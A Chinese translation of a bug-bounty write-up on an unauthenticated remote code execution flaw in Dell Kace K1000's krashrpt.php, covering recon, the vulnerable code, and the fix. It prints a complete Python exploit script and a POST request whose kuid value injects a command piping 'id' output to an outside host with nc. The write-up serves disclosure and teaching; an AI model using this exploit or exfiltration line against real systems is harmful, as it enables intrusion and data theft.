***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **本文分享的writeup是关于Dell Kace
K1000管理应用的一个未授权远程代码执行漏洞（RCE），作者于2018年9月在HackerOne和厂商Dropbox共同举办的H1-3120黑客马拉松大赛中发现了该漏洞，漏洞的发现和利用过程相对简单，但前期的侦查踩点过程却颇费心思。最终凭借该漏洞，作者获得了H1-3120大赛的“最具价值黑客”荣誉（MVH），并囊获了一笔不菲赏金。**

![](https://image.3001.net/images/20190422/1555942768_5cbdcd70db969.jpg!small)

## 漏洞简介

漏洞影响 Dell Kace K1000
v6.4.120756之前版本的应用程序，由于程序中的escapeshellarg方法函数存在可绕过隐患（Bypass），最终，可以利用该隐患在K1000应用中实现未授权的远程代码执行。因为测试厂商Dropbox用K1000
v6.3来管理其大量的客户服务端，所以理论上来说，可以利用该漏洞在所有Dropbox客户管理系统上实现RCE攻击。Dell在内部修复中把该漏洞编号为K1-18652，所以在此我们暂且也把该漏洞称为K1-18652。

> escapeshellarg：把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg ( string $arg ) :
> string，功能是将字符串$arg增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell
> 函数，以实现安全的转义输出。（[PHP -> escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php) ）

前期踩点非常关键！

在H1-3120比赛现场，针对测试厂商Dropbox提供的目标系统，我发现了其中一个Dell Kace K1000 管理系统的登录界面：

![](https://image.3001.net/images/20190422/1555942184_5cbdcb288821c.png!small)

于是，我就对Dell Kace K1000进行了信息收集，该系统此前为Dell旗下产品，现为Quest Software
Inc公司拥有。这里有意思的是，Quest同时在其[官网上提供了Kace
K1000的试用版应用程序](https://www.quest.com/register/74480/)，但是，试用版应用只是最新的v9.0.270，与比赛现场在Dropbox环境中发现的版本完全不一样：

![](https://image.3001.net/images/20190422/1555942230_5cbdcb560402b.png!small)

在比赛现场给出的测试目标中，Dropbox目标系统中的Kace K1000为v6.3.113397版本：

    
    
    X-DellKACE-Appliance: k1000
    
    X-DellKACE-Host: redacted.com
    
    X-DellKACE-Version: 6.3.113397
    
    X-KBOX-WebServer: redacted.com
    
    X-KBOX-Version: 6.3.113397

所以，这样来看，在Kace
K1000的最新版本和现场目标测试版本中，至少存在三个版本的间隔迭代。为此，我还用了社工手段，请求Quest客户支持中心是否能为我提供Kace
K1000的v6版本程序，但是，最终却没有成功，可见我不是一个高明的社工黑客。。。

前期踩点非常关键！！

起初，我觉得Kace
K1000的现场目标测试版本和Quest官网提供的最新版本之间差异肯定很大，因为这种大版本迭代一定存在很多的代码改动，但之后，我还是决定在Quest官网提供的v9最新版本身上做一些测试，看看它是否适用于v6的现场测试版本。

于是，我在测试环境中安装了Kace K1000 v9程序，准备进行一些分析。但老实说，刚开始，我并不抱太大希望。但最终事实证明，我还是太武断了。

前期踩点非常关键！！！

在安装了Kace K1000 v9程序的分析环境中，当对其源码进行分析时，我发现了一个有意思的文件 -/service/krashrpt.php，它可以无需授权验证就能访问，是专门用来处理崩溃的转储文件的。

仔细分析该文件，其中存在与漏洞K1-18652相关的隐患点。代码逻辑中，为了防止目录遍历，采用basename()方法返回参数kuid 和
name中的文件名部分，$values为用户端通过GET或POST提交的参数引用。如下：

    
    
    try {
    
        // K1-18652 make sure we escape names so we don't get extra path characters to do path traversal
    
        $kuid = basename($values['kuid']);
    
        $name = basename($values['name']);
    
    } catch( Exception $e ) {
    
        KBLog( "Missing URL param: " . $e->getMessage() );
    
        exit();
    
    }

参数 kuid 和 name则用于后续的一个zip文件生成过程，如下：  

    
    
    $tmpFnBase = "krash_{$name}_{$kuid}";
    
    $tmpDir = tempnam( KB_UPLOAD_DIR, $tmpFnBase );
    
    unlink( $tmpDir );
    
    $zipFn = $tmpDir . ".zip";

然而，漏洞K1-18652隐患处不仅引入了防止目录遍历问题的basename方法，另外，由于存在$tmpDir 和
$zipFn字符串，所以，它还采用了两个escapeshellarg函数调用以防止任意代码注入。如下：

    
    
    // unzip the archive to a tmpDir, and delete the .zip file
    
    // K1-18652 Escape the shell arguments to avoid remote execution from inputs
    
    exec( "/usr/local/bin/unzip -d " . escapeshellarg($tmpDir) . " " . escapeshellarg($zipFn));
    
    unlink( $zipFn );

早前有[案例分析](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)，由于 escapeshellarg
函数会在字符串外部添加单引号进行包裹，攻击者经过输入构造，可造成绕过漏洞。而这里的$kuid 和 $name参数在取值时就存在单引号形式 - 'kuid'
和 ‘name’，所以看似存在绕过风险，但经过测试，绕过是不可行的。也就是说，Dell Kace K1000 v9程序在此处是安全的。

敢于猜测尝试！！！

这样来看，即使Dell Kace K1000 v9版本程序采用了看似不安全的escapeshellarg
函数调用，但它在其中已进行过安全修复。基于早前的escapeshellarg绕过隐患分析，而对于现场目标系统的Dell Kace K1000
v6版本我仍不确定是否存在此隐患。但出于好奇，我还是针对v6版本程序，假设其中存在escapeshellarg
函数绕过隐患，最终编写出了以下[RCE攻击方式的exploit](https://www.exploit-db.com/exploits/46684)对其进行了测试：

    
    
    #!/usr/bin/python
    
    # Exploit Title: Dell KACE Systems Management Appliance (K1000) <= 6.4.120756 Unauthenticated RCE
    
    # Version:       <= 6.4.120756
    
    # Date:          2019-04-09
    
    # Author:        Julien Ahrens (@MrTuxracer)
    
    # Software Link: <https://www.quest.com/products/kace-systems-management-appliance/>
    
    # Write-up:      <https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/>
    
    # Note:          The software is maintained by Quest now, but the vulnerability was fixed while Quest was part of Dell.            
    
    #
    
    # Usage: python3 exploit.py [https://localhost](https://localhost/ "https://localhost") 'sleep 10'
    
    import requests
    
    import sys
    
    import urllib3
    
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    target_url = sys.argv[1]
    
    payload = sys.argv[2]
    
    r = requests.post(target_url + '/service/krashrpt.php', data={
    
        'kuid' : '`' + payload + '`'
    
        }, verify=False)
    
    print('Response: %s %s\nKACE Version: %s\nResponse time: %ss' % (r.status_code, r.reason, r.headers['X-DellKACE-Version'], r.elapsed.total_seconds()))

exploit中提交的POST请求如下：  

    
    
    POST /service/krashrpt.php HTTP/1.1
    
    Host: redacted.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Cookie: kboxid=r8cnb8r3otq27vd14j7e0ahj24
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 37
    
    kuid=`id | nc [www.rcesecurity.com](http://www.rcesecurity.com/ "http://www.rcesecurity.com") 53`

也就是，我从本机系统中提交了上述exploit生成的POST请求到部署有Dell Kace K1000
v6版本应用的目标系统中，之后，成功远程执行了一条linux的id命令，如下：  

![](https://image.3001.net/images/20190422/1555942572_5cbdccac28432.png!small)

太棒了，成功了！漏洞实质影响是可以用它来执行任意代码，实现RCE，由于测试厂商Dropbox使用了Dell Kace K1000
v6.3作为客户服务端管理，所以，可以说Dropbox的所有客户服务端管理系统都就此沦陷了。

## 漏洞修复

H1-3120比赛现场上报漏洞后，我凭借该漏洞获得了MVH荣誉和一笔不菲赏金。此后，我联系 Quest 咨询漏洞修复情况，但 Quest
告知我漏洞转给了Dell方面进行了修复。此后，Quest告知我漏洞已经在Dell Kace K1000 v
6.4（6.4.120822）版本中得到了修复。但是，我却没找到任何公开的漏洞披露和修复公告，也就是说，Dell是偷偷地修复了该漏洞。

## 总结

当你发现目标系统运行有某个应用后，可以考虑针对该应用搭建一个本地测试环境进行进一步的深入分析。对我来说，这种方法还是比较有效的。最后，还是要感谢Dropbox奖励的好大一笔赏金！

 ***参考来源：[rcesecurity](https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/)，clouds编译，转载请注明来自FreeBuf.COM**

